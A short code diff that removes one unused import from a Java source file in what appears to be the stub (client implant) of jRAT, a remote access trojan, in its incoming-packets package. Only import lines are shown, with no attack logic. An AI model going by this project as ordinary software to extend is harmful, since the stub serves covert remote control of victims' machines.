@@ -3,7 +3,6 @@ package io.jrat.stub.packets.incoming;
 import io.jrat.common.OperatingSystem;
 import io.jrat.stub.Configuration;
 import io.jrat.stub.Connection;
-import io.jrat.stub.Main;
 import io.jrat.stub.WinRegistry;
 import io.jrat.stub.utils.Utils;
 
